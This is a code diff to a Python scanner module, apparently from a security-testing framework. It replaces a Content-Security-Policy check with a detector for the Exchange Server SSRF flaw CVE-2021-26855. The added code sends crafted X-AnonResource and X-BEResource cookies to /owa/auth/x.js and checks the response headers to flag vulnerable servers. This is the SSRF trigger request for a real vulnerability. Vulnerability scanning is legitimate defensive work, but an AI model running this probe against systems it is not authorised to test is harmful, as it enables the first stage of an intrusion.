@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Author: Pradeep Jairamani , github.com/pradeepjairamani
 
 import socket
 import socks
@@ -18,15 +17,13 @@ from core.load_modules import load_file_path
 from lib.socks_resolver.engine import getaddrinfo
 from core._time import now
 from core.log import __log_into_file
-from bs4 import BeautifulSoup
-from lib.payload.wordlists import useragents
 import requests
 
+from lib.payload.wordlists import useragents
 
 def extra_requirements_dict():
     return {
-        "csp_vuln_ports": [443, 80],
-        "csp_vuln_check_source": ["False"],
+        "vuln_ports": [80, 443]
     }
 
 
@@ -58,12 +55,10 @@ def conn(targ, port, timeout_sec, socks_proxy):
         return None
 
 
-def content_policy(target, port, timeout_sec, log_in_file, language, time_sleep,
-                   thread_tmp_filename, socks_proxy, scan_id, scan_cmd, check_source_flag):
+def msexchange_vuln(target, port, timeout_sec, log_in_file, language, time_sleep,
+                   thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
     try:
         s = conn(target, port, timeout_sec, socks_proxy)
-        global weak
-        weak = False
         if not s:
             return False
         else:
@@ -71,69 +66,49 @@ def content_policy(target, port, timeout_sec, log_in_file, language, time_sleep,
                 target = 'https://' + target
             if target_type(target) != "HTTP" and port == 80:
                 target = 'http://' + target
-
+            cookies = {
+                "X-AnonResource": "true",
+                "X-AnonResource-Backend": "localhost/ecp/default.flt?~3",
+                "X-BEResource": "localhost/owa/auth/logon.aspx?~3",
+            }
             headers = {'User-agent': random.choice(useragents.useragents())}
 
-            req = requests.get(target, headers=headers,
-                               timeout=timeout_sec, verify=False)
-            try:
-                weak = False
-                csp = req.headers['Content-Security-Policy']
-                if 'unsafe-inline' in csp or 'unsafe-eval' in csp:
-                    weak = True
-                return False
-            except Exception as e:
-                if check_source_flag:
-                    soup = BeautifulSoup(req.text, "html.parser")
-                    meta_tags = soup.find_all('meta', {'http-equiv': 'Content-Security-Policy'})
-
-                    if len(meta_tags) == 0:
+            if target.endswith("/"):
+                target = target[:-1]
+            path = '/owa/auth/x.js'
+            req = requests.get(target + path, cookies=cookies, verify=False,
+                               headers=headers, timeout=timeout_sec)
+            if req.status_code in [500, 503]:
+                try:
+                    header_server = req.headers['x-calculatedbetarget']
+                    if 'localhost' in header_server or "NegotiateSecurityContext" in req.text:
                         return True
-                    directives = meta_tags[0].attrs['content']
-
-                    if 'unsafe-inline' in directives or 'unsafe-eval' in directives:
-                        weak = True
-
+                    else:
+                        return False
+                except Exception as e:
                     return False
-                else:
-                    return True
     except Exception as e:
-        # some error warning
+        warn(messages(language, 'no_response'))
         return False
 
 
-def __content_policy(target, port, timeout_sec, log_in_file, language, time_sleep,
-                     thread_tmp_filename, socks_proxy, scan_id, scan_cmd, check_source_flag):
-    if content_policy(target, port, timeout_sec, log_in_file, language, time_sleep,
-                      thread_tmp_filename, socks_proxy, scan_id, scan_cmd, check_source_flag):
-        description = ('CSP makes it possible for server administrators to reduce or'
-                       ' eliminate the vectors by which XSS can occur by specifying '
-                       'the domains that the browser should consider to be valid '
-                       'sources of executable scripts. ')
-        info(messages(language, "target_vulnerable").format(target, port, description))
+def __msexchange_vuln(target, port, timeout_sec, log_in_file, language, time_sleep,
+                     thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
+    if msexchange_vuln(target, port, timeout_sec, log_in_file, language, time_sleep,
+                      thread_tmp_filename, socks_proxy, scan_id, scan_cmd):
+        info(messages(language, "target_vulnerable").format(target, port,
+                                                            'Exchange Server SSRF Vulnerability CVE-2021-26855'))
         __log_into_file(thread_tmp_filename, 'w', '0', language)
         data = json.dumps({'HOST': target, 'USERNAME': '', 'PASSWORD': '', 'PORT': port,
-                           'TYPE': 'content_security_policy_vuln',
-                           'DESCRIPTION': messages(language, "vulnerable").format(description), 'TIME': now(),
+                           'TYPE': 'msexchange_cve_2021_26855_vuln',
+                           'DESCRIPTION': messages(language, "vulnerable").format(
+                               'Exchange Server SSRF Vulnerability CVE-2021-26855'), 'TIME': now(),
                            'CATEGORY': "vuln",
                            'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
         __log_into_file(log_in_file, 'a', data, language)
         return True
     else:
-        if not weak:
-            return False
-        else:
-            description = 'weak CSP implementation. Using unsafe-inline or unsafe-eval in CSP is not safe.'
-            info(messages(language, "target_vulnerable").format(target, port, description))
-            __log_into_file(thread_tmp_filename, 'w', '0', language)
-            data = json.dumps(
-                {'HOST': target, 'USERNAME': '', 'PASSWORD': '', 'PORT': port, 'TYPE': 'content_security_policy_vuln',
-                 'DESCRIPTION': messages(language, "vulnerable").format(description),
-                 'TIME': now(),
-                 'CATEGORY': "vuln",
-                 'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
-            __log_into_file(log_in_file, 'a', data, language)
-            return True
+        return False
 
 
 def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep, language,
@@ -148,10 +123,7 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
                         extra_requirement] = methods_args[extra_requirement]
         extra_requirements = new_extra_requirements
         if ports is None:
-            ports = extra_requirements["csp_vuln_ports"]
-        check_source_flag = False
-        if extra_requirements["csp_vuln_check_source"][0] == "True":
-            check_source_flag = True
+            ports = extra_requirements["vuln_ports"]
         if target_type(target) == 'HTTP':
             target = target_to_host(target)
         threads = []
@@ -163,16 +135,16 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
         keyboard_interrupt_flag = False
         for port in ports:
             port = int(port)
-            t = threading.Thread(target=__content_policy,
+            t = threading.Thread(target=__msexchange_vuln,
                                  args=(target, int(port), timeout_sec, log_in_file, language, time_sleep,
-                                       thread_tmp_filename, socks_proxy, scan_id, scan_cmd, check_source_flag))
+                                       thread_tmp_filename, socks_proxy, scan_id, scan_cmd))
             threads.append(t)
             t.start()
             trying += 1
             if verbose_level > 3:
                 info(
-                    messages(language, "trying_message").format(trying, total_req, num,
-                                                                total, target, port, 'content_security_policy_vuln'))
+                    messages(language, "trying_message").format(trying, total_req, num, total, target, port,
+                                                                'msexchange_cve_2021_26855_vuln'))
             while 1:
                 try:
                     if threading.activeCount() >= thread_number:
@@ -199,15 +171,15 @@ def start(target, users, passwds, ports, timeout_sec, thread_number, num, total,
         thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
         if thread_write == 1 and verbose_level != 0:
             info(messages(language, "no_vulnerability_found").format(
-                'Content Security Policy'))
+                'x-calculatedbetarget header not found'))
             data = json.dumps({'HOST': target, 'USERNAME': '', 'PASSWORD': '', 'PORT': '',
-                               'TYPE': 'content_security_policy_vuln',
+                               'TYPE': 'msexchange_cve_2021_26855_vuln',
                                'DESCRIPTION': messages(language, "no_vulnerability_found").format(
-                                   'Content Security Policy'),
-                               'TIME': now(), 'CATEGORY': "scan", 'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
+                                   'x-calculatedbetarget header not found'), 'TIME': now(),
+                               'CATEGORY': "scan", 'SCAN_ID': scan_id, 'SCAN_CMD': scan_cmd})
             __log_into_file(log_in_file, 'a', data, language)
         os.remove(thread_tmp_filename)
 
     else:
         warn(messages(language, "input_target_error").format(
-            'content_security_policy_vuln', target))
+            'msexchange_cve_2021_26855_vuln', target))
